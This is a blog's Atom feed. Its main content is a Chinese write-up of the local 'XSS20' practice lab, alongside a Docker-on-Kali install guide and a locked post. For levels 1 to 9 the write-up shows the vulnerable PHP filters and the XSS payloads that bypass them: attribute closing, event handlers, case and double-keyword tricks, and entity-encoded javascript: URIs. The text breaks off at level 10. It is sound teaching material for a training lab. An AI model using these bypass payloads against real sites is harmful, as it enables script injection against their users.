<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BoBo&#39;s Blog</title>
  
  <subtitle>Day Day Up~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bobosec.top/"/>
  <updated>2019-03-26T09:08:14.465Z</updated>
  <id>http://bobosec.top/</id>
  
  <author>
    <name>BoBo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python山脚村的进阶之路</title>
    <link href="http://bobosec.top/2019/03/16/python-start/"/>
    <id>http://bobosec.top/2019/03/16/python-start/</id>
    <published>2019-03-16T12:54:57.000Z</published>
    <updated>2019-03-26T09:08:14.465Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      python 入坑之路
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="学一门语言" scheme="http://bobosec.top/tags/%E5%AD%A6%E4%B8%80%E9%97%A8%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>docker从入门开始~</title>
    <link href="http://bobosec.top/2019/03/13/docker-start/"/>
    <id>http://bobosec.top/2019/03/13/docker-start/</id>
    <published>2019-03-13T14:14:42.000Z</published>
    <updated>2019-03-15T10:28:49.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker-在kail的搭建"><a href="#docker-在kail的搭建" class="headerlink" title="docker 在kail的搭建"></a>docker 在kail的搭建</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先要确定自己的kali是否能安装</p><p>Docker需要Linux Kernels 大于3.10并且是64-bit的机器，用uname -a可以查看是否符合要求。</p><h3 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h3><p>然后一般需要更新一下自己的kali源，命令如下：<code>apt-get update</code></p><p>这时候有可能会出现GPG key 过期的情况，所以还需要弄一个新的GPG key</p><p>命令：<code>wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</code></p><p>然后再输入：<code>apt-get update</code>更新</p><p>这里贴几个目前为止能用的源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#东软大学</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#重庆大学</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="准备安装"><a href="#准备安装" class="headerlink" title="准备安装"></a>准备安装</h3><p>在终端中输入：<code>vim /etc/apt/sources.list.d/backports.list</code>如果不会用vim的可以输入：<code>leafpad /etc/apt/sources.list.d/backports.list</code></p><p>在这里面添加如下代码：<code>deb http://http.debian.net/debian wheezy-backports main</code></p><p>然后刷新源： <code>apt-get update</code> </p><p>确认apt添加了https方法和CA cerificates：<code>apt-get install apt-transport-https ca-certificates</code></p><p>添加一个新的GPG key：<code>apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</code></p><p>等待加载完毕后，编辑文件：<code>vim /etc/apt/sources.list.d/docker.list</code></p><p>插入以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">deb https://apt.dockerproject.org/repo debian-wheezy main</span><br><span class="line">#On Debian Jessie</span><br><span class="line">#deb https://apt.dockerproject.org/repo debian-jessie main</span><br><span class="line">#On Debian Stretch/Sid</span><br><span class="line"></span><br><span class="line">#deb https://apt.dockerproject.org/repo debian-stretch main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存完毕后再一次更新源：<code>apt-get update</code></p><p>确认一下是否正确安装了repository：<code>apt-cache policy docker-engine</code></p><h3 id="开始安装-docker"><a href="#开始安装-docker" class="headerlink" title="开始安装 docker"></a>开始安装 docker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install docker-engine</span><br><span class="line"></span><br><span class="line">#安装结束，打开docker服务</span><br><span class="line"></span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line">#验证安装，运行测试样例</span><br><span class="line"></span><br><span class="line">docker run hello-world</span><br><span class="line"></span><br><span class="line">#如果没有错误就大功造成了！</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>安装完成后输入<code>docker info</code>查看一下自己的docker信息。</p>]]></content>
    
    <summary type="html">
    
      docker入坑记录
    
    </summary>
    
      <category term="学习记录" scheme="http://bobosec.top/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日益成长的小白" scheme="http://bobosec.top/tags/%E6%97%A5%E7%9B%8A%E6%88%90%E9%95%BF%E7%9A%84%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>XSS20 Write-up</title>
    <link href="http://bobosec.top/2019/03/01/XSS20-Write-up/"/>
    <id>http://bobosec.top/2019/03/01/XSS20-Write-up/</id>
    <published>2019-03-01T08:03:15.000Z</published>
    <updated>2019-03-01T15:01:28.509Z</updated>
    
    <content type="html"><![CDATA[<p>学一下XSS基本应用和绕过，这篇博客会结合源码一步一步分析。</p><p>xss20 是一个在本地搭建的xss练习的集合，一共有20关。每一关考察的都不一样，从简到难。</p><p>贴一下xss20的<a href="https://share.weiyun.com/5Y8E6zO" target="_blank" rel="noopener">下载地址</a> 密码：mu7pcg</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>XSS攻击全称<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/8186208" target="_blank" rel="noopener">跨站脚本攻击</a>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面。XSS漏洞和著名的SQL<a href="https://baike.baidu.com/item/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">注入漏洞</a>一样，都是利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。</p><h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><ol><li>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</li><li>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</li><li>DOMXSS：<br>这种类型则是利用非法输入来闭合对应的html标签。<br>比如，有这样的一个a标签：<code>&lt;a href=&#39;$var&#39;&gt;&lt;/a&gt;</code>乍看问题不大，可是当$var的内容变为 <code>’ onclick=’alert(/xss/) //</code>，这段代码就会被执行。</li></ol><p>XSS常见绕过点击<a href="https://blog.csdn.net/keepxp/article/details/52054388" target="_blank" rel="noopener">这篇文章</a></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less  1"></a>Less  1</h2><p>会有提示点击开始XSS，我们点击图片开始第一关。</p><p>第一关什么输入框都没有，所以我们看到url，url中的字符长度就是下面payload的长度，所以这两个是可控变量，我们从这想办法。</p><p>URL:<code>http://localhost/XSS20/level1.php?name=test</code></p><p>我们直接在name后面跟一个alert()函数试一下</p><p><code>http://localhost/XSS20/level1.php?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>提示我们已经过关。</p><p>我们看一下关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/03/01/XSS20-Write-up/less1.jpg" alt=" "></p><p>我们可以看到在欢迎用户那里js被执行。因为第一关没有过滤任何东西，所以直接执行，不多说~</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h2><p>第二关我们在搜索框继续输入第一关payload发现回显<code>没有找到和&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;相关的结果.</code></p><p>从浏览器看一下最后被解析成了什么</p><p><img src="/2019/03/01/XSS20-Write-up/less2.jpg" alt=" "></p><p>发现<code>&lt; 和 &gt;</code>全部被转义了，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现有个htmlspecialchars()函数，这个函数作用是把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p><p>但是这里我们看到value可以被提前闭合，所以可以这样绕过：<code>1&quot;&gt;&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><p><img src="/2019/03/01/XSS20-Write-up/less2.1.jpg" alt=" "></p><p>直接闭合了value=“1”绕过</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h2><p>第三关我们继续上一关payload发现不行，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这次在keyword和查询都加了htmlspecialchars()函数转义。但是在有很多JS事件还是可以触发弹窗，没有大于和小于号所以他也不会转义。</p><ol><li>onmouseenter=alert(‘xss’)  //当鼠标移动到这里就睡触发</li><li>onclick=alert(‘xss’)             //当点击这个事件时就会触发</li><li>onclick =alert(‘xss’)           //加一个空格方便绕过</li></ol><p>我们这里用onclick试一下，但是htmlspecialchars默认配置是不过滤单引号的。只有设置了：quotestyle，才可以过滤<br>so~就用单引号来测试</p><p><code>1&#39;onclick=&#39;window.alert()</code>弹窗成功！我们看一下解析成了什么样子</p><p><img src="/2019/03/01/XSS20-Write-up/less3.jpg" alt=" "></p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less 4"></a>Less 4</h2><p>我们先拿上一次payload试一下，发现不行，看一下控制台发现这次解析的是双引号，所以只要改一下就好。</p><p><code>&quot;onclick=&quot;window.alert()</code>这样就可以弹窗了，后面的语句被构造成了：<code>&lt;input name=keyword  value=&quot;&quot;onclick=&quot;window.alert()&quot;&gt;</code></p><p>就不插图片了原理都是一样的，代码里面多了几个$str大家认真看一下就好。</p><p>PS：这几关都会有点慢，清理cookies或者多等一会儿才能弹窗</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h2><p>用了上一次payload然后看一下解析成了：<code>&lt;input name=keyword  value=&quot;&quot;o_nclick=&quot;window.alert()&quot;&quot;&gt;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现o和n被隔开了，看一下源码，不仅转义括号还有on这个单词，所以就是说之前用的事件触发就不能再用了</p><p>我们知道链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript，so我们尝试嵌入一个连接，在连接的时候调用alert，payload如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="string">'1'</span>)<span class="string">"&gt;bobosec&lt;/a&gt;"</span></span><br></pre></td></tr></table></figure><p><img src="/2019/03/01/XSS20-Write-up/less5.jpg" alt=" "></p><p>点击我们插入的超链接，即可触发弹窗，input最后被构造成这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">""</span>&gt;&lt;a href=<span class="string">"javascript:alert('1')"</span>&gt;bobosec&lt;/a<span class="string">""</span>&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h2><p>这一关用上一关payload发现href被分开了所以不能执行</p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到很多标签都被分割了，但是这个比前一关少了<code>$str = strtolower(）</code>这个限制，也就是大小写，所以我们直接用大小写绕过就可以。</p><p><code>&quot;Onclick=&quot;window.alert(&#39;1&#39;)</code>这个也好慢2333，还以为写错了。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less 7"></a>Less 7</h2><p>看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里面把我们输入的所有字符全部替换成小写，并且把这些标签名都替换为了空。但是这属于黑名单模式，我们直接双写绕一下就好。</p><p><code>&quot;&gt;&lt;a hrHREFef=&quot;javasSCRIPTcript:alert(&#39;xss&#39;)&quot;&gt;bobosec&lt;/a&gt;&quot;</code></p><p><img src="/2019/03/01/XSS20-Write-up/less7.jpg" alt=" "></p><p>可以看到对比效果</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码绕过就有点麻烦了，所以我们在添加友情链接那里想办法，友情链接只是转义了script所以我们采用别的编码即可如下：</p><p><code>java&amp;#x73;cript:alert()</code>java没被过滤所以不用转义，剩下的字母随便转义一个就好，这里有<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">网站</a>可以在线编码。</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h2><p>这关页面和上一关看着差不多，我们试一下上一关payload，发现会提示链接不合法，看一下源码~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大部分是一样的，只不过在友情链接哪里多了一个判断<code>if(false===strpos($str7,&#39;http://&#39;))</code>这说明链接必须要有<code>http://</code>，strpos()作用是查找 “http://“ 在$srt7中第一次出现的位置，所以我们在上一关基础上改一下就好：</p><p><code>java&amp;#x73;cript:alert()/*http://www.bobosec.top*/</code></p><p>这里需要把我们的网站注释一下，如果不注释他会一直访问，但是访问不到，所以只要让他检测到有<code>http://</code>就好.</p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h2><p>第十关试了半天也不知道咋回事。。。所以直接看源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 